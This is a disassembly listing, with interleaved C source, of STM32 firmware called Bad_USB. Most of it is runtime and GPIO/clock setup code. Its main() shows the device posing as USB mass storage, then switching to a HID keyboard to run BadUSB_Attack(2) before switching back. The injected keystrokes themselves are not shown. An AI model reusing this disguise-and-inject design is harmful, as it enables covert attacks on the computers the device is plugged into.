
Bad_USB.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .isr_vector   0000018c  08000000  08000000  00010000  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .text         0000cea8  0800018c  0800018c  0001018c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  2 .rodata       00000198  0800d034  0800d034  0001d034  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .ARM.extab    00000000  0800d1cc  0800d1cc  00020240  2**0
                  CONTENTS
  4 .ARM          00000008  0800d1cc  0800d1cc  0001d1cc  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  5 .preinit_array 00000000  0800d1d4  0800d1d4  00020240  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  6 .init_array   00000004  0800d1d4  0800d1d4  0001d1d4  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  7 .fini_array   00000004  0800d1d8  0800d1d8  0001d1d8  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  8 .data         00000240  20000000  0800d1dc  00020000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  9 .bss          00001cd4  20000240  0800d41c  00020240  2**2
                  ALLOC
 10 ._user_heap_stack 00001604  20001f14  0800d41c  00021f14  2**0
                  ALLOC
 11 .ARM.attributes 00000030  00000000  00000000  00020240  2**0
                  CONTENTS, READONLY
 12 .comment      00000043  00000000  00000000  00020270  2**0
                  CONTENTS, READONLY
 13 .debug_info   0002098d  00000000  00000000  000202b3  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 14 .debug_abbrev 00005371  00000000  00000000  00040c40  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_aranges 00001b30  00000000  00000000  00045fb8  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_rnglists 000014c0  00000000  00000000  00047ae8  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_macro  000265ec  00000000  00000000  00048fa8  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_line   00025ade  00000000  00000000  0006f594  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_str    000d23f4  00000000  00000000  00095072  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .debug_frame  00006f48  00000000  00000000  00167468  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 21 .debug_line_str 00000049  00000000  00000000  0016e3b0  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .text:

0800018c <__do_global_dtors_aux>:
 800018c:	b510      	push	{r4, lr}
 800018e:	4c05      	ldr	r4, [pc, #20]	; (80001a4 <__do_global_dtors_aux+0x18>)
 8000190:	7823      	ldrb	r3, [r4, #0]
 8000192:	b933      	cbnz	r3, 80001a2 <__do_global_dtors_aux+0x16>
 8000194:	4b04      	ldr	r3, [pc, #16]	; (80001a8 <__do_global_dtors_aux+0x1c>)
 8000196:	b113      	cbz	r3, 800019e <__do_global_dtors_aux+0x12>
 8000198:	4804      	ldr	r0, [pc, #16]	; (80001ac <__do_global_dtors_aux+0x20>)
 800019a:	f3af 8000 	nop.w
 800019e:	2301      	movs	r3, #1
 80001a0:	7023      	strb	r3, [r4, #0]
 80001a2:	bd10      	pop	{r4, pc}
 80001a4:	20000240 	.word	0x20000240
 80001a8:	00000000 	.word	0x00000000
 80001ac:	0800d01c 	.word	0x0800d01c

080001b0 <frame_dummy>:
 80001b0:	b508      	push	{r3, lr}
 80001b2:	4b03      	ldr	r3, [pc, #12]	; (80001c0 <frame_dummy+0x10>)
 80001b4:	b11b      	cbz	r3, 80001be <frame_dummy+0xe>
 80001b6:	4903      	ldr	r1, [pc, #12]	; (80001c4 <frame_dummy+0x14>)
 80001b8:	4803      	ldr	r0, [pc, #12]	; (80001c8 <frame_dummy+0x18>)
 80001ba:	f3af 8000 	nop.w
 80001be:	bd08      	pop	{r3, pc}
 80001c0:	00000000 	.word	0x00000000
 80001c4:	20000244 	.word	0x20000244
 80001c8:	0800d01c 	.word	0x0800d01c

080001cc <strlen>:
 80001cc:	4603      	mov	r3, r0
 80001ce:	f813 2b01 	ldrb.w	r2, [r3], #1
 80001d2:	2a00      	cmp	r2, #0
 80001d4:	d1fb      	bne.n	80001ce <strlen+0x2>
 80001d6:	1a18      	subs	r0, r3, r0
 80001d8:	3801      	subs	r0, #1
 80001da:	4770      	bx	lr

080001dc <__aeabi_uldivmod>:
 80001dc:	b953      	cbnz	r3, 80001f4 <__aeabi_uldivmod+0x18>
 80001de:	b94a      	cbnz	r2, 80001f4 <__aeabi_uldivmod+0x18>
 80001e0:	2900      	cmp	r1, #0
 80001e2:	bf08      	it	eq
 80001e4:	2800      	cmpeq	r0, #0
 80001e6:	bf1c      	itt	ne
 80001e8:	f04f 31ff 	movne.w	r1, #4294967295
 80001ec:	f04f 30ff 	movne.w	r0, #4294967295
 80001f0:	f000 b970 	b.w	80004d4 <__aeabi_idiv0>
 80001f4:	f1ad 0c08 	sub.w	ip, sp, #8
 80001f8:	e96d ce04 	strd	ip, lr, [sp, #-16]!
 80001fc:	f000 f806 	bl	800020c <__udivmoddi4>
 8000200:	f8dd e004 	ldr.w	lr, [sp, #4]
 8000204:	e9dd 2302 	ldrd	r2, r3, [sp, #8]
 8000208:	b004      	add	sp, #16
 800020a:	4770      	bx	lr

0800020c <__udivmoddi4>:
 800020c:	e92d 47f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, lr}
 8000210:	9e08      	ldr	r6, [sp, #32]
 8000212:	460d      	mov	r5, r1
 8000214:	4604      	mov	r4, r0
 8000216:	460f      	mov	r7, r1
 8000218:	2b00      	cmp	r3, #0
 800021a:	d14a      	bne.n	80002b2 <__udivmoddi4+0xa6>
 800021c:	428a      	cmp	r2, r1
 800021e:	4694      	mov	ip, r2
 8000220:	d965      	bls.n	80002ee <__udivmoddi4+0xe2>
 8000222:	fab2 f382 	clz	r3, r2
 8000226:	b143      	cbz	r3, 800023a <__udivmoddi4+0x2e>
 8000228:	fa02 fc03 	lsl.w	ip, r2, r3
 800022c:	f1c3 0220 	rsb	r2, r3, #32
 8000230:	409f      	lsls	r7, r3
 8000232:	fa20 f202 	lsr.w	r2, r0, r2
 8000236:	4317      	orrs	r7, r2
 8000238:	409c      	lsls	r4, r3
 800023a:	ea4f 4e1c 	mov.w	lr, ip, lsr #16
 800023e:	fa1f f58c 	uxth.w	r5, ip
 8000242:	fbb7 f1fe 	udiv	r1, r7, lr
 8000246:	0c22      	lsrs	r2, r4, #16
 8000248:	fb0e 7711 	mls	r7, lr, r1, r7
 800024c:	ea42 4207 	orr.w	r2, r2, r7, lsl #16
 8000250:	fb01 f005 	mul.w	r0, r1, r5
 8000254:	4290      	cmp	r0, r2
 8000256:	d90a      	bls.n	800026e <__udivmoddi4+0x62>
 8000258:	eb1c 0202 	adds.w	r2, ip, r2
 800025c:	f101 37ff 	add.w	r7, r1, #4294967295
 8000260:	f080 811c 	bcs.w	800049c <__udivmoddi4+0x290>
 8000264:	4290      	cmp	r0, r2
 8000266:	f240 8119 	bls.w	800049c <__udivmoddi4+0x290>
 800026a:	3902      	subs	r1, #2
 800026c:	4462      	add	r2, ip
 800026e:	1a12      	subs	r2, r2, r0
 8000270:	b2a4      	uxth	r4, r4
 8000272:	fbb2 f0fe 	udiv	r0, r2, lr
 8000276:	fb0e 2210 	mls	r2, lr, r0, r2
 800027a:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 800027e:	fb00 f505 	mul.w	r5, r0, r5
 8000282:	42a5      	cmp	r5, r4
 8000284:	d90a      	bls.n	800029c <__udivmoddi4+0x90>
 8000286:	eb1c 0404 	adds.w	r4, ip, r4
 800028a:	f100 32ff 	add.w	r2, r0, #4294967295
 800028e:	f080 8107 	bcs.w	80004a0 <__udivmoddi4+0x294>
 8000292:	42a5      	cmp	r5, r4
 8000294:	f240 8104 	bls.w	80004a0 <__udivmoddi4+0x294>
 8000298:	4464      	add	r4, ip
 800029a:	3802      	subs	r0, #2
 800029c:	ea40 4001 	orr.w	r0, r0, r1, lsl #16
 80002a0:	1b64      	subs	r4, r4, r5
 80002a2:	2100      	movs	r1, #0
 80002a4:	b11e      	cbz	r6, 80002ae <__udivmoddi4+0xa2>
 80002a6:	40dc      	lsrs	r4, r3
 80002a8:	2300      	movs	r3, #0
 80002aa:	e9c6 4300 	strd	r4, r3, [r6]
 80002ae:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002b2:	428b      	cmp	r3, r1
 80002b4:	d908      	bls.n	80002c8 <__udivmoddi4+0xbc>
 80002b6:	2e00      	cmp	r6, #0
 80002b8:	f000 80ed 	beq.w	8000496 <__udivmoddi4+0x28a>
 80002bc:	2100      	movs	r1, #0
 80002be:	e9c6 0500 	strd	r0, r5, [r6]
 80002c2:	4608      	mov	r0, r1
 80002c4:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002c8:	fab3 f183 	clz	r1, r3
 80002cc:	2900      	cmp	r1, #0
 80002ce:	d149      	bne.n	8000364 <__udivmoddi4+0x158>
 80002d0:	42ab      	cmp	r3, r5
 80002d2:	d302      	bcc.n	80002da <__udivmoddi4+0xce>
 80002d4:	4282      	cmp	r2, r0
 80002d6:	f200 80f8 	bhi.w	80004ca <__udivmoddi4+0x2be>
 80002da:	1a84      	subs	r4, r0, r2
 80002dc:	eb65 0203 	sbc.w	r2, r5, r3
 80002e0:	2001      	movs	r0, #1
 80002e2:	4617      	mov	r7, r2
 80002e4:	2e00      	cmp	r6, #0
 80002e6:	d0e2      	beq.n	80002ae <__udivmoddi4+0xa2>
 80002e8:	e9c6 4700 	strd	r4, r7, [r6]
 80002ec:	e7df      	b.n	80002ae <__udivmoddi4+0xa2>
 80002ee:	b902      	cbnz	r2, 80002f2 <__udivmoddi4+0xe6>
 80002f0:	deff      	udf	#255	; 0xff
 80002f2:	fab2 f382 	clz	r3, r2
 80002f6:	2b00      	cmp	r3, #0
 80002f8:	f040 8090 	bne.w	800041c <__udivmoddi4+0x210>
 80002fc:	1a8a      	subs	r2, r1, r2
 80002fe:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000302:	fa1f fe8c 	uxth.w	lr, ip
 8000306:	2101      	movs	r1, #1
 8000308:	fbb2 f5f7 	udiv	r5, r2, r7
 800030c:	fb07 2015 	mls	r0, r7, r5, r2
 8000310:	0c22      	lsrs	r2, r4, #16
 8000312:	ea42 4200 	orr.w	r2, r2, r0, lsl #16
 8000316:	fb0e f005 	mul.w	r0, lr, r5
 800031a:	4290      	cmp	r0, r2
 800031c:	d908      	bls.n	8000330 <__udivmoddi4+0x124>
 800031e:	eb1c 0202 	adds.w	r2, ip, r2
 8000322:	f105 38ff 	add.w	r8, r5, #4294967295
 8000326:	d202      	bcs.n	800032e <__udivmoddi4+0x122>
 8000328:	4290      	cmp	r0, r2
 800032a:	f200 80cb 	bhi.w	80004c4 <__udivmoddi4+0x2b8>
 800032e:	4645      	mov	r5, r8
 8000330:	1a12      	subs	r2, r2, r0
 8000332:	b2a4      	uxth	r4, r4
 8000334:	fbb2 f0f7 	udiv	r0, r2, r7
 8000338:	fb07 2210 	mls	r2, r7, r0, r2
 800033c:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 8000340:	fb0e fe00 	mul.w	lr, lr, r0
 8000344:	45a6      	cmp	lr, r4
 8000346:	d908      	bls.n	800035a <__udivmoddi4+0x14e>
 8000348:	eb1c 0404 	adds.w	r4, ip, r4
 800034c:	f100 32ff 	add.w	r2, r0, #4294967295
 8000350:	d202      	bcs.n	8000358 <__udivmoddi4+0x14c>
 8000352:	45a6      	cmp	lr, r4
 8000354:	f200 80bb 	bhi.w	80004ce <__udivmoddi4+0x2c2>
 8000358:	4610      	mov	r0, r2
 800035a:	eba4 040e 	sub.w	r4, r4, lr
 800035e:	ea40 4005 	orr.w	r0, r0, r5, lsl #16
 8000362:	e79f      	b.n	80002a4 <__udivmoddi4+0x98>
 8000364:	f1c1 0720 	rsb	r7, r1, #32
 8000368:	408b      	lsls	r3, r1
 800036a:	fa22 fc07 	lsr.w	ip, r2, r7
 800036e:	ea4c 0c03 	orr.w	ip, ip, r3
 8000372:	fa05 f401 	lsl.w	r4, r5, r1
 8000376:	fa20 f307 	lsr.w	r3, r0, r7
 800037a:	40fd      	lsrs	r5, r7
 800037c:	ea4f 491c 	mov.w	r9, ip, lsr #16
 8000380:	4323      	orrs	r3, r4
 8000382:	fbb5 f8f9 	udiv	r8, r5, r9
 8000386:	fa1f fe8c 	uxth.w	lr, ip
 800038a:	fb09 5518 	mls	r5, r9, r8, r5
 800038e:	0c1c      	lsrs	r4, r3, #16
 8000390:	ea44 4405 	orr.w	r4, r4, r5, lsl #16
 8000394:	fb08 f50e 	mul.w	r5, r8, lr
 8000398:	42a5      	cmp	r5, r4
 800039a:	fa02 f201 	lsl.w	r2, r2, r1
 800039e:	fa00 f001 	lsl.w	r0, r0, r1
 80003a2:	d90b      	bls.n	80003bc <__udivmoddi4+0x1b0>
 80003a4:	eb1c 0404 	adds.w	r4, ip, r4
 80003a8:	f108 3aff 	add.w	sl, r8, #4294967295
 80003ac:	f080 8088 	bcs.w	80004c0 <__udivmoddi4+0x2b4>
 80003b0:	42a5      	cmp	r5, r4
 80003b2:	f240 8085 	bls.w	80004c0 <__udivmoddi4+0x2b4>
 80003b6:	f1a8 0802 	sub.w	r8, r8, #2
 80003ba:	4464      	add	r4, ip
 80003bc:	1b64      	subs	r4, r4, r5
 80003be:	b29d      	uxth	r5, r3
 80003c0:	fbb4 f3f9 	udiv	r3, r4, r9
 80003c4:	fb09 4413 	mls	r4, r9, r3, r4
 80003c8:	ea45 4404 	orr.w	r4, r5, r4, lsl #16
 80003cc:	fb03 fe0e 	mul.w	lr, r3, lr
 80003d0:	45a6      	cmp	lr, r4
 80003d2:	d908      	bls.n	80003e6 <__udivmoddi4+0x1da>
 80003d4:	eb1c 0404 	adds.w	r4, ip, r4
 80003d8:	f103 35ff 	add.w	r5, r3, #4294967295
 80003dc:	d26c      	bcs.n	80004b8 <__udivmoddi4+0x2ac>
 80003de:	45a6      	cmp	lr, r4
 80003e0:	d96a      	bls.n	80004b8 <__udivmoddi4+0x2ac>
 80003e2:	3b02      	subs	r3, #2
 80003e4:	4464      	add	r4, ip
 80003e6:	ea43 4308 	orr.w	r3, r3, r8, lsl #16
 80003ea:	fba3 9502 	umull	r9, r5, r3, r2
 80003ee:	eba4 040e 	sub.w	r4, r4, lr
 80003f2:	42ac      	cmp	r4, r5
 80003f4:	46c8      	mov	r8, r9
 80003f6:	46ae      	mov	lr, r5
 80003f8:	d356      	bcc.n	80004a8 <__udivmoddi4+0x29c>
 80003fa:	d053      	beq.n	80004a4 <__udivmoddi4+0x298>
 80003fc:	b156      	cbz	r6, 8000414 <__udivmoddi4+0x208>
 80003fe:	ebb0 0208 	subs.w	r2, r0, r8
 8000402:	eb64 040e 	sbc.w	r4, r4, lr
 8000406:	fa04 f707 	lsl.w	r7, r4, r7
 800040a:	40ca      	lsrs	r2, r1
 800040c:	40cc      	lsrs	r4, r1
 800040e:	4317      	orrs	r7, r2
 8000410:	e9c6 7400 	strd	r7, r4, [r6]
 8000414:	4618      	mov	r0, r3
 8000416:	2100      	movs	r1, #0
 8000418:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 800041c:	f1c3 0120 	rsb	r1, r3, #32
 8000420:	fa02 fc03 	lsl.w	ip, r2, r3
 8000424:	fa20 f201 	lsr.w	r2, r0, r1
 8000428:	fa25 f101 	lsr.w	r1, r5, r1
 800042c:	409d      	lsls	r5, r3
 800042e:	432a      	orrs	r2, r5
 8000430:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000434:	fa1f fe8c 	uxth.w	lr, ip
 8000438:	fbb1 f0f7 	udiv	r0, r1, r7
 800043c:	fb07 1510 	mls	r5, r7, r0, r1
 8000440:	0c11      	lsrs	r1, r2, #16
 8000442:	ea41 4105 	orr.w	r1, r1, r5, lsl #16
 8000446:	fb00 f50e 	mul.w	r5, r0, lr
 800044a:	428d      	cmp	r5, r1
 800044c:	fa04 f403 	lsl.w	r4, r4, r3
 8000450:	d908      	bls.n	8000464 <__udivmoddi4+0x258>
 8000452:	eb1c 0101 	adds.w	r1, ip, r1
 8000456:	f100 38ff 	add.w	r8, r0, #4294967295
 800045a:	d22f      	bcs.n	80004bc <__udivmoddi4+0x2b0>
 800045c:	428d      	cmp	r5, r1
 800045e:	d92d      	bls.n	80004bc <__udivmoddi4+0x2b0>
 8000460:	3802      	subs	r0, #2
 8000462:	4461      	add	r1, ip
 8000464:	1b49      	subs	r1, r1, r5
 8000466:	b292      	uxth	r2, r2
 8000468:	fbb1 f5f7 	udiv	r5, r1, r7
 800046c:	fb07 1115 	mls	r1, r7, r5, r1
 8000470:	ea42 4201 	orr.w	r2, r2, r1, lsl #16
 8000474:	fb05 f10e 	mul.w	r1, r5, lr
 8000478:	4291      	cmp	r1, r2
 800047a:	d908      	bls.n	800048e <__udivmoddi4+0x282>
 800047c:	eb1c 0202 	adds.w	r2, ip, r2
 8000480:	f105 38ff 	add.w	r8, r5, #4294967295
 8000484:	d216      	bcs.n	80004b4 <__udivmoddi4+0x2a8>
 8000486:	4291      	cmp	r1, r2
 8000488:	d914      	bls.n	80004b4 <__udivmoddi4+0x2a8>
 800048a:	3d02      	subs	r5, #2
 800048c:	4462      	add	r2, ip
 800048e:	1a52      	subs	r2, r2, r1
 8000490:	ea45 4100 	orr.w	r1, r5, r0, lsl #16
 8000494:	e738      	b.n	8000308 <__udivmoddi4+0xfc>
 8000496:	4631      	mov	r1, r6
 8000498:	4630      	mov	r0, r6
 800049a:	e708      	b.n	80002ae <__udivmoddi4+0xa2>
 800049c:	4639      	mov	r1, r7
 800049e:	e6e6      	b.n	800026e <__udivmoddi4+0x62>
 80004a0:	4610      	mov	r0, r2
 80004a2:	e6fb      	b.n	800029c <__udivmoddi4+0x90>
 80004a4:	4548      	cmp	r0, r9
 80004a6:	d2a9      	bcs.n	80003fc <__udivmoddi4+0x1f0>
 80004a8:	ebb9 0802 	subs.w	r8, r9, r2
 80004ac:	eb65 0e0c 	sbc.w	lr, r5, ip
 80004b0:	3b01      	subs	r3, #1
 80004b2:	e7a3      	b.n	80003fc <__udivmoddi4+0x1f0>
 80004b4:	4645      	mov	r5, r8
 80004b6:	e7ea      	b.n	800048e <__udivmoddi4+0x282>
 80004b8:	462b      	mov	r3, r5
 80004ba:	e794      	b.n	80003e6 <__udivmoddi4+0x1da>
 80004bc:	4640      	mov	r0, r8
 80004be:	e7d1      	b.n	8000464 <__udivmoddi4+0x258>
 80004c0:	46d0      	mov	r8, sl
 80004c2:	e77b      	b.n	80003bc <__udivmoddi4+0x1b0>
 80004c4:	3d02      	subs	r5, #2
 80004c6:	4462      	add	r2, ip
 80004c8:	e732      	b.n	8000330 <__udivmoddi4+0x124>
 80004ca:	4608      	mov	r0, r1
 80004cc:	e70a      	b.n	80002e4 <__udivmoddi4+0xd8>
 80004ce:	4464      	add	r4, ip
 80004d0:	3802      	subs	r0, #2
 80004d2:	e742      	b.n	800035a <__udivmoddi4+0x14e>

080004d4 <__aeabi_idiv0>:
 80004d4:	4770      	bx	lr
 80004d6:	bf00      	nop

080004d8 <MX_GPIO_Init>:
        * Output
        * EVENT_OUT
        * EXTI
*/
void MX_GPIO_Init(void)
{
 80004d8:	b580      	push	{r7, lr}
 80004da:	b088      	sub	sp, #32
 80004dc:	af00      	add	r7, sp, #0

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 80004de:	f107 030c 	add.w	r3, r7, #12
 80004e2:	2200      	movs	r2, #0
 80004e4:	601a      	str	r2, [r3, #0]
 80004e6:	605a      	str	r2, [r3, #4]
 80004e8:	609a      	str	r2, [r3, #8]
 80004ea:	60da      	str	r2, [r3, #12]
 80004ec:	611a      	str	r2, [r3, #16]

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
 80004ee:	4b24      	ldr	r3, [pc, #144]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f0:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004f2:	4a23      	ldr	r2, [pc, #140]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f4:	f043 0304 	orr.w	r3, r3, #4
 80004f8:	64d3      	str	r3, [r2, #76]	; 0x4c
 80004fa:	4b21      	ldr	r3, [pc, #132]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004fc:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004fe:	f003 0304 	and.w	r3, r3, #4
 8000502:	60bb      	str	r3, [r7, #8]
 8000504:	68bb      	ldr	r3, [r7, #8]
  __HAL_RCC_GPIOA_CLK_ENABLE();
 8000506:	4b1e      	ldr	r3, [pc, #120]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000508:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800050a:	4a1d      	ldr	r2, [pc, #116]	; (8000580 <MX_GPIO_Init+0xa8>)
 800050c:	f043 0301 	orr.w	r3, r3, #1
 8000510:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000512:	4b1b      	ldr	r3, [pc, #108]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000514:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000516:	f003 0301 	and.w	r3, r3, #1
 800051a:	607b      	str	r3, [r7, #4]
 800051c:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_GPIOB_CLK_ENABLE();
 800051e:	4b18      	ldr	r3, [pc, #96]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000520:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000522:	4a17      	ldr	r2, [pc, #92]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000524:	f043 0302 	orr.w	r3, r3, #2
 8000528:	64d3      	str	r3, [r2, #76]	; 0x4c
 800052a:	4b15      	ldr	r3, [pc, #84]	; (8000580 <MX_GPIO_Init+0xa8>)
 800052c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800052e:	f003 0302 	and.w	r3, r3, #2
 8000532:	603b      	str	r3, [r7, #0]
 8000534:	683b      	ldr	r3, [r7, #0]

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOB, SPI1_CS_Pin|LD3_Pin, GPIO_PIN_SET);
 8000536:	2201      	movs	r2, #1
 8000538:	2109      	movs	r1, #9
 800053a:	4812      	ldr	r0, [pc, #72]	; (8000584 <MX_GPIO_Init+0xac>)
 800053c:	f001 fb42 	bl	8001bc4 <HAL_GPIO_WritePin>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = SPI1_CS_Pin;
 8000540:	2301      	movs	r3, #1
 8000542:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000544:	2301      	movs	r3, #1
 8000546:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_PULLUP;
 8000548:	2301      	movs	r3, #1
 800054a:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 800054c:	2300      	movs	r3, #0
 800054e:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(SPI1_CS_GPIO_Port, &GPIO_InitStruct);
 8000550:	f107 030c 	add.w	r3, r7, #12
 8000554:	4619      	mov	r1, r3
 8000556:	480b      	ldr	r0, [pc, #44]	; (8000584 <MX_GPIO_Init+0xac>)
 8000558:	f001 f9ca 	bl	80018f0 <HAL_GPIO_Init>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = LD3_Pin;
 800055c:	2308      	movs	r3, #8
 800055e:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000560:	2301      	movs	r3, #1
 8000562:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000564:	2300      	movs	r3, #0
 8000566:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 8000568:	2300      	movs	r3, #0
 800056a:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(LD3_GPIO_Port, &GPIO_InitStruct);
 800056c:	f107 030c 	add.w	r3, r7, #12
 8000570:	4619      	mov	r1, r3
 8000572:	4804      	ldr	r0, [pc, #16]	; (8000584 <MX_GPIO_Init+0xac>)
 8000574:	f001 f9bc 	bl	80018f0 <HAL_GPIO_Init>

}
 8000578:	bf00      	nop
 800057a:	3720      	adds	r7, #32
 800057c:	46bd      	mov	sp, r7
 800057e:	bd80      	pop	{r7, pc}
 8000580:	40021000 	.word	0x40021000
 8000584:	48000400 	.word	0x48000400

08000588 <main>:
/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
 8000588:	b580      	push	{r7, lr}
 800058a:	b082      	sub	sp, #8
 800058c:	af00      	add	r7, sp, #0
  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();
 800058e:	f000 fd8c 	bl	80010aa <HAL_Init>
  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();
 8000592:	f000 f833 	bl	80005fc <SystemClock_Config>
  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
 8000596:	f7ff ff9f 	bl	80004d8 <MX_GPIO_Init>
  MX_USART2_UART_Init();
 800059a:	f000 fcc3 	bl	8000f24 <MX_USART2_UART_Init>
  MX_SPI1_Init();
 800059e:	f000 fb5b 	bl	8000c58 <MX_SPI1_Init>
  /* USER CODE BEGIN 2 */
  int flag = 0;
 80005a2:	2300      	movs	r3, #0
 80005a4:	607b      	str	r3, [r7, #4]
  isMSC = 1;
 80005a6:	4b12      	ldr	r3, [pc, #72]	; (80005f0 <main+0x68>)
 80005a8:	2201      	movs	r2, #1
 80005aa:	601a      	str	r2, [r3, #0]
  MX_USB_DEVICE_Init_MSC();
 80005ac:	f00b fef4 	bl	800c398 <MX_USB_DEVICE_Init_MSC>

  memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80005b0:	220f      	movs	r2, #15
 80005b2:	2100      	movs	r1, #0
 80005b4:	480f      	ldr	r0, [pc, #60]	; (80005f4 <main+0x6c>)
 80005b6:	f00c fcf7 	bl	800cfa8 <memset>

  flag = 1;
 80005ba:	2301      	movs	r3, #1
 80005bc:	607b      	str	r3, [r7, #4]
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while(1){
	  InterruptTrap(&InterruptFlag);
 80005be:	480e      	ldr	r0, [pc, #56]	; (80005f8 <main+0x70>)
 80005c0:	f000 fa3e 	bl	8000a40 <InterruptTrap>

	  if(flag == 1){
 80005c4:	687b      	ldr	r3, [r7, #4]
 80005c6:	2b01      	cmp	r3, #1
 80005c8:	d1f9      	bne.n	80005be <main+0x36>
		  HAL_Delay(10000); //random slot to switch HID
 80005ca:	f242 7010 	movw	r0, #10000	; 0x2710
 80005ce:	f000 fde1 	bl	8001194 <HAL_Delay>
		  SwitchToHID();
 80005d2:	f000 f88b 	bl	80006ec <SwitchToHID>
		  HAL_Delay(2000); //test Device Manager linux 2000
 80005d6:	f44f 60fa 	mov.w	r0, #2000	; 0x7d0
 80005da:	f000 fddb 	bl	8001194 <HAL_Delay>
		  //Attack begin
		  BadUSB_Attack(2);
 80005de:	2002      	movs	r0, #2
 80005e0:	f000 fa4c 	bl	8000a7c <BadUSB_Attack>

		  flag = 0;
 80005e4:	2300      	movs	r3, #0
 80005e6:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 80005e8:	f000 f894 	bl	8000714 <SwitchToMSC>
	  InterruptTrap(&InterruptFlag);
 80005ec:	e7e7      	b.n	80005be <main+0x36>
 80005ee:	bf00      	nop
 80005f0:	20000978 	.word	0x20000978
 80005f4:	2000025c 	.word	0x2000025c
 80005f8:	20000270 	.word	0x20000270

080005fc <SystemClock_Config>:
/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
 80005fc:	b580      	push	{r7, lr}
 80005fe:	b096      	sub	sp, #88	; 0x58
 8000600:	af00      	add	r7, sp, #0
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
 8000602:	f107 0314 	add.w	r3, r7, #20
 8000606:	2244      	movs	r2, #68	; 0x44
 8000608:	2100      	movs	r1, #0
 800060a:	4618      	mov	r0, r3
 800060c:	f00c fccc 	bl	800cfa8 <memset>
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
 8000610:	463b      	mov	r3, r7
 8000612:	2200      	movs	r2, #0
 8000614:	601a      	str	r2, [r3, #0]
 8000616:	605a      	str	r2, [r3, #4]
 8000618:	609a      	str	r2, [r3, #8]
 800061a:	60da      	str	r2, [r3, #12]
 800061c:	611a      	str	r2, [r3, #16]

  /** Configure the main internal regulator output voltage
  */
  if (HAL_PWREx_ControlVoltageScaling(PWR_REGULATOR_VOLTAGE_SCALE1) != HAL_OK)
 800061e:	f44f 7000 	mov.w	r0, #512	; 0x200
 8000622:	f003 f8c9 	bl	80037b8 <HAL_PWREx_ControlVoltageScaling>
 8000626:	4603      	mov	r3, r0
 8000628:	2b00      	cmp	r3, #0
 800062a:	d001      	beq.n	8000630 <SystemClock_Config+0x34>
  {
